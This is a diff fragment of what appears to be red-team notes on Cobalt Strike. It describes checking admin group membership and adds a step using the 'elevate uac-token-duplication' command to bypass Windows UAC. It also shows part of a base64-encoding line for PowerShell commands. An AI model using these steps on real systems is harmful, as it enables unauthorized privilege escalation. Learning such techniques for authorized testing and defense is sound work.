@@ -117,3 +117,4 @@ PS : [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('
 2. If you see some error like **In medium integrity but user is a local administrator - UAC can be bypassed.** Then this attack **may** be successful. 
 3. Also you can verify it by typing commands ``shell whoami /groups`` and ``shell whoami /priv``. You must be in **admin** group e.g. **BUILTIN\Administrators**
 4. Two methods are provided by **CS** for this **UAC Bypass** i.e. **elevate** and **runasadmin**
+5. in cobalt strike type: `elevate uac-token-duplication <your listner name>` e.g. ``elevate uac-token-duplication my1st64bit``
